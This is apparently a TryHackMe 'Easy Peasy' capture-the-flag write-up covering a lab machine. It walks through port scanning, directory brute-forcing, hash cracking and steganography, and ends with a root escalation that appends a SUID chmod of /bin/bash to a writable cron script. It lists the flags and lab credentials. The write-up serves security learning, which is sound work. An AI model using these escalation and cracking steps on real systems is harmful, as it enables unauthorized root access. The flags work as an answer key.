# TryHackMe — Easy Peasy
### CTF Writeup by Obada

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square)
![Status](https://img.shields.io/badge/Status-Pwned%20%E2%9C%94-success?style=flat-square)
![Tags](https://img.shields.io/badge/Tags-nmap%20%7C%20gobuster%20%7C%20stego%20%7C%20john%20%7C%20privesc-blue?style=flat-square)

---

## Table of Contents

| # | Section |
|---|---------|
| 1 | [Reconnaissance](#1-reconnaissance) |
| 2 | [Flag 1 — Hidden Directory](#2-flag-1--hidden-directory) |
| 3 | [Flag 2 — Robots.txt](#3-flag-2--robotstxt) |
| 4 | [Flag 3 — Apache Source](#4-flag-3--apache-source) |
| 5 | [Flag 4 — Hidden Hash](#5-flag-4--hidden-hash) |
| 6 | [Flag 5 — Hash Cracking](#6-flag-5--hash-cracking) |
| 7 | [Flag 6 — Steganography](#7-flag-6--steganography) |
| 8 | [Flag 7 — User Flag](#8-flag-7--user-flag) |
| 9 | [Flag 8 — Root](#9-flag-8--root) |

---

## 1. Reconnaissance

Full port scan to map the attack surface:

```bash
nmap -sV -sC -p- --min-rate 5000 <TARGET_IP>
```

| Port  | Service | Version      |
|-------|---------|--------------|
| 80    | HTTP    | nginx 1.16.1 |
| 6498  | SSH     | OpenSSH      |
| 65524 | HTTP    | Apache       |

> 3 open ports — Nginx on 80, SSH on 6498, Apache on 65524 (highest port).

---

## 2. Flag 1 — Hidden Directory

Brute-forced directories on the Nginx service:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

Found `/hidden` → enumerated further → `/hidden/whatever`.
Page source contained a **Base62-encoded** string, decoded with CyberChef.

```
✔ flag{f1rs7_fl4g}
```

---

## 3. Flag 2 — Robots.txt

Checked `robots.txt` on the Apache service:

```bash
curl http://<TARGET_IP>:65524/robots.txt
```

Found an unusual `User-Agent` field — identified as an **MD5 hash**, cracked with an online lookup tool.

```
✔ flag{1m_s3c0nd_fl4g}
```

---

## 4. Flag 3 — Apache Source

Visited `http://<TARGET_IP>:65524` and viewed the page source.
Flag was embedded directly in the HTML.

```
✔ flag{9fdafbd64c47471a8f54cd3fc64cd312}
```

---

## 5. Flag 4 — Hidden Hash

Still in the Apache source, found a second encoded string.
Decoded with CyberChef → `From Base62` → revealed a hidden directory:

```
/n0th1ng3ls3m4tt3r
```

---

## 6. Flag 5 — Hash Cracking

Navigated to the discovered directory. Page source contained a hash alongside a local image `binarycodepixabay.jpg`.
Cracked the hash using John the Ripper:

```bash
john --format=gost hash.txt --wordlist=easypeasy.txt
```

```
✔ Password: mypasswordforthatjob
```

---

## 7. Flag 6 — Steganography

The image from the previous step had hidden data. Used **stegseek** to extract it:

```bash
stegseek binarycodepixabay.jpg easypeasy.txt
```

Extracted `secrettext.txt` and cracked the passphrase in one step.
The password inside was **binary-encoded** — decoded with CyberChef → `From Binary`.

```
Username : boring
Password : iconvertedmypasswordtobinary
```

---

## 8. Flag 7 — User Flag

SSH'd into the machine with the discovered credentials:

```bash
ssh boring@<TARGET_IP> -p 6498
cat user.txt
```

Content was **ROT13-encoded** — decoded with CyberChef:

```
✔ flag{n0wits33msn0rm4l}
```

---

## 9. Flag 8 — Root

### Enumeration

```bash
sudo -l           # no sudo rights
cat /etc/crontab
```

Crontab revealed a script running as root every minute:

```
* * * * *   root   cd /var/www/ && sudo bash .mysecretcronjob.sh
```

### Exploitation

The script was writable — injected a SUID payload:

```bash
echo "chmod +s /bin/bash" >> /var/www/.mysecretcronjob.sh
```

Waited ~60 seconds, then:

```bash
bash -p
whoami   # root
```

### Root Flag

```bash
cat /root/.root.txt
```

```
✔ flag{63a9f0ea7bb98050796b649e85481845}
```

---

## Attack Path

```
Nmap
 ├── Port 80    (Nginx)   → GoBuster → /hidden/whatever → Base62           → Flag 1
 ├── Port 65524 (Apache)  → robots.txt → MD5                               → Flag 2
 │                        → Page Source                                    → Flag 3
 │                        → Base62 → /n0th1ng3ls3m4tt3r
 │                              → Hash Crack (john)                        → Flag 5
 │                              → stegseek (binarycodepixabay.jpg)         → Flag 6
 └── Port 6498  (SSH)     → ssh boring@ → user.txt ROT13                  → Flag 7
                                → crontab → SUID injection → root          → Flag 8
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning |
| `gobuster` | Directory enumeration |
| `john` | Hash cracking |
| `stegseek` / `steghide` | Steganography |
| `CyberChef` | Base62 · Binary · ROT13 decoding |

---

*Writeup by **Obada** · All 8 flags captured* 🏴
